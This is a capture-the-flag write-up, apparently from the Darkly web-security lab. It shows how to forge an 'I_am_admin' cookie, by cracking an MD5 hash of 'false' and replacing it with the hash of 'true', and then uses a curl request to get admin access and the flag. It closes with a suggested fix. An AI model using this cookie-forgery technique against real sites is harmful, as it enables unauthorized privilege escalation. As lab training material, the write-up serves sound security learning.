In the http://192.168.1.32/?page=recover page, there is a HTML form described as follow:
<form action="#" method="POST">
  <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
  <input type="submit" name="Submit" value= "Submit">
</form>

Step 1: Understanding the Form Submission
The /recover page sends a POST request with the following form data:
mail: webmaster@borntosec.com
Submit: Submit

And the request has a cookie:
I_am_admin=68934a3e9455fa72420237eb05902327

Step 2: Analyze the Cookie
The cookie I_am_admin=68934a3e9455fa72420237eb05902327 appears to be a hash. Let's decode the hash to understand its content.

Step 3: Decode the Hash
The given hash 68934a3e9455fa72420237eb05902327 is an MD5 hash. Using an MD5 decryption tool or an online database like hashes.com, we can decode this hash.

Let's decode it using https://md5decrypt.net/
68934a3e9455fa72420237eb05902327: false
It seems that the hash corresponds to the string false. This indicates that the current cookie value implies the user is not an admin.

Step 4: Modify the Cookie
Since false is the value indicating non-admin status, let's try changing it to true.
Generate the MD5 hash for true: b326b5062b2f0e69046810717534cb09

Step 5: Send the POST Request
Use a tool like curl or Postman to send the POST request with the modified cookie.
curl -X POST http://192.168.1.32/?page=recover \
  -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09"

Step 7: Analyze the Response
After sending the POST request with the modified cookie, the response contain an altert that displays the flag:
<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3');</script>

A way to fix this vulnerability would be to use JWT (with a strong secret) instead of a handmade "I_am_admin" cookie.